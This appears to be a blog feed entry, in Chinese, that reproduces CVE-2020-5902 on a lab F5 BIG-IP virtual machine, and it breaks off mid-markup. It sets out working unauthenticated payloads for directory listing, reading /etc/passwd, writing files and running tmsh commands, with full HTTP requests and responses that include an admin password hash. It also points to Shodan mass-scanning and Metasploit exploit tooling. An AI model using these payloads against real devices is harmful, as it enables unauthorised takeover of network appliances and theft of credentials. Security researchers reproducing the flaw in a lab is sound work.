<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chaceshadow&#39;s Blog</title>
  
  <subtitle>神无月</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-11T11:01:01.021Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Ch4ce</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现</title>
    <link href="http://yoursite.com/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-07-11T10:55:17.000Z</published>
    <updated>2020-07-11T11:01:01.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现"><a href="#CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现" class="headerlink" title="CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现"></a>CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。</p><p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>BIG-IP 15.x: 15.1.0/15.0.0</li><li>BIG-IP 14.x: 14.1.0 ~ 14.1.2</li><li>BIG-IP 13.x: 13.1.0 ~ 13.1.3</li><li>BIG-IP 12.x: 12.1.0 ~ 12.1.5</li><li>BIG-IP 11.x: 11.6.1 ~ 11.6.5</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在登录页面注册：<code>https://www.f5.com.cn/trials/big-ip-virtual-edition</code></p><p>打开下载页面：<code>https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&amp;pro=big-ip_v15.x&amp;ver=15.1.0&amp;container=Virtual-Edition</code></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><p>使用vmware-workstation软件运行镜像文件</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="2"><br><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><p>使用密码root/default登陆系统，第一次需要重置root密码，新密码为bigippass<br><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><p>配置网卡信息，输入config，配置ip地址<br><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p><p>浏览器访问<code>https://192.168.1.245</code>，跳转如下图就说明好啦！</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p><p>使用admin/bigippass登录</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="Shodan批量扫描脚本"><a href="#Shodan批量扫描脚本" class="headerlink" title="Shodan批量扫描脚本"></a>Shodan批量扫描脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aqhmal&#x2F;CVE-2020-5902-Scanner</span><br></pre></td></tr></table></figure><h3 id="Nmap扫描脚本"><a href="#Nmap扫描脚本" class="headerlink" title="Nmap扫描脚本"></a>Nmap扫描脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RootUp&#x2F;PersonalStuff&#x2F;blob&#x2F;master&#x2F;http-vuln-cve2020-5902.nse</span><br><span class="line">poc:nmap --script http-vuln-cve2020-5902 -p443 192.168.1.245</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote><p>Payload</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</span><br></pre></td></tr></table></figure><blockquote><p>Request</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     "dir": "tmui",</span><br><span class="line">     "children": [</span><br><span class="line">       &#123;</span><br><span class="line">         "dir": "WEB-INF",</span><br><span class="line">         "children": [</span><br><span class="line">           &#123;</span><br><span class="line">             "dir": "classes",</span><br><span class="line">             "children": [</span><br><span class="line">               &#123;</span><br><span class="line">                 "dir": "org",</span><br><span class="line">                 "children": [</span><br><span class="line">                   &#123;</span><br><span class="line">                     "dir": "apache",</span><br><span class="line">                     "children": [</span><br><span class="line">                       &#123;</span><br><span class="line">                         "dir": "jsp",</span><br><span class="line">                         "children": [</span><br><span class="line">                           &#123;</span><br><span class="line">                             "dir": "common",</span><br><span class="line">                             "children": [</span><br><span class="line">                               &#123;</span><br><span class="line">                                 "file": "deleteconfirm_jsp.class"</span><br><span class="line">  </span><br><span class="line">                                   ............................</span><br></pre></td></tr></table></figure><p>截图如下（复现失败，返回服务器内部错误500）</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><blockquote><p>Payload</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br></pre></td></tr></table></figure><blockquote><p>Request</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.245</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 8.8.8.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 10 Jul 2020 14:42:03 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=16070400; includeSubDomains</span><br><span class="line"><span class="attribute">Set-Cookie</span>: JSESSIONID=08827183860922C1DCF8A89BB46E7839; Path=/tmui; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 1916</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;"output":"root:x:0:0:root:\/root:\/bin\/bash\nbin:x:1:1:bin:\/bin:\/sbin\/nologin\ndaemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\nadm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\nlp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\nmail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\noperator:x:11:0:operator:\/root:\/sbin\/nologin\nnobody:x:99:99:Nobody:\/:\/sbin\/nologin\ntmshnobody:x:32765:32765:tmshnobody:\/:\/sbin\/nologin\nadmin:x:0:500:Admin User:\/home\/admin:\/bin\/false\nsupport:x:0:0:support:\/root:\/bin\/bash\nf5emsvr:x:975:975:F5 EM Service Account:\/root:\/bin\/false\nvcsa:x:69:69:virtual console memory owner:\/dev:\/sbin\/nologin\ndbus:x:81:81:System message bus:\/:\/sbin\/nologin\nsystemd-bus-proxy:x:974:998:systemd Bus Proxy:\/:\/sbin\/nologin\nsystemd-network:x:192:192:systemd Network Management:\/:\/sbin\/nologin\npolkitd:x:27:27:User for polkitd:\/:\/sbin\/nologin\nnslcd:x:65:55:LDAP Client User:\/:\/sbin\/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:\/dev\/null:\/sbin\/nologin\npostgres:x:26:26:PostgreSQL Server:\/var\/local\/pgsql\/data:\/sbin\/nologin\ntomcat:x:91:91:Apache Tomcat:\/usr\/share\/tomcat:\/sbin\/nologin\nhsqldb:x:96:96::\/var\/lib\/hsqldb:\/sbin\/nologin\nsshd:x:74:74:Privilege-separated SSH:\/var\/empty\/sshd:\/sbin\/nologin\nrpc:x:32:32:Rpcbind Daemon:\/var\/lib\/rpcbind:\/sbin\/nologin\nntp:x:38:38::\/etc\/ntp:\/sbin\/nologin\nf5_remoteuser:x:499:499:f5 remote user account:\/home\/f5_remoteuser:\/sbin\/nologin\ntcpdump:x:72:72::\/:\/sbin\/nologin\noprofile:x:16:16:Special user account to be used by OProfile:\/:\/sbin\/nologin\nsdm:x:191:996:sdmuser:\/var\/sdm:\/bin\/false\nnamed:x:25:25:Named:\/var\/named:\/bin\/false\napache:x:48:48:Apache:\/usr\/local\/www:\/sbin\/nologin\nsyscheck:x:199:10::\/:\/sbin\/nologin\nmysql:x:98:98:MySQL server:\/var\/lib\/mysql:\/sbin\/nologin\nrestnoded:x:198:198::\/:\/sbin\/nologin\n"&#125;</span><br></pre></td></tr></table></figure><p>漏洞截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="10"></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="11"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>Payload</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</span><br><span class="line"><span class="attribute">POST</span>: fileName=/tmp/1.txt&amp;content=CVE-2020-5902</span><br></pre></td></tr></table></figure><blockquote><p>Request</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.245</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=472D937EAA86CEF84A8C1C5C6C5EEDBD;</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 8.8.8.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 41</span><br><span class="line"></span><br><span class="line">fileName=/tmp/1.txt&amp;content=CVE-2020-5902</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 10 Jul 2020 15:54:30 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=16070400; includeSubDomains</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 4</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p>截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="12"></p><p>读取上传文件</p><blockquote><p>Request</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileRead.jsp?fileName&#x3D;&#x2F;tmp&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.245</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: JSESSIONID&#x3D;472D937EAA86CEF84A8C1C5C6C5EEDBD;</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Fri, 10 Jul 2020 15:57:50 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Strict-Transport-Security: max-age&#x3D;16070400; includeSubDomains</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;ISO-8859-1</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">Content-Security-Policy: default-src &#39;self&#39;  &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob:; img-src &#39;self&#39; data:  http:&#x2F;&#x2F;127.4.1.1 http:&#x2F;&#x2F;127.4.2.1</span><br><span class="line">Content-Length: 32</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;output&quot;:&quot;CVE-2020-5902\n&quot;&#125;</span><br></pre></td></tr></table></figure><p>文件上传成功,截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="13"></p><p>###　命令执行（RCE）</p><blockquote><p>Payload</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</span><br></pre></td></tr></table></figure><p><code>list auth user</code>  查看所有用户</p><p><code>list auth user admin</code>  查看管理员账户</p><blockquote><p>Request</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.245</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 8.8.8.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><blockquote><p>Response</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 10 Jul 2020 15:47:16 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">X-Frame-Options</span>: SAMEORIGIN</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=16070400; includeSubDomains</span><br><span class="line"><span class="attribute">Set-Cookie</span>: JSESSIONID=238233448C2CEE035A5902915FF0D73B; Path=/tmui; Secure; HttpOnly</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span>: nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span>: 1; mode=block</span><br><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 341</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"error":"","output":"auth user admin &#123;\n    description \"Admin User\"\n    encrypted-password $6$iae1LEWL$UHp47yM0TDm9ly5xMwixyNu8TTYNcFLrEplrdqiZ82eMzX3ISbjY3VEYIAmuT\/EK7ybt2GN..pyvZpBehnLI31\n    partition Common\n    partition-access &#123;\n        all-partitions &#123;\n            role admin\n        &#125;\n    &#125;\n    shell none\n&#125;\n"&#125;</span><br></pre></td></tr></table></figure><p>漏洞截图如下</p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="14"></p><p><img src="/2020/07/11/CVE-2020-5902%EF%BC%9AF5-BIG-IP-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="15"></p><p><em>PS:执行返回500错误的时候多执行几次即可成功</em></p><p><strong>使用github python脚本工具执行命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![16](16.png)</span><br><span class="line"></span><br><span class="line">修改目标地址</span><br><span class="line"></span><br><span class="line">![17](17.png)</span><br><span class="line"></span><br><span class="line">运行python脚本</span><br><span class="line"></span><br><span class="line">![18](18.png)</span><br><span class="line"></span><br><span class="line">### MSF </span><br><span class="line"></span><br><span class="line">MSF f5_bigip_tmui_rce 漏洞利用脚本</span><br></pre></td></tr></table></figure><p><a href="https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 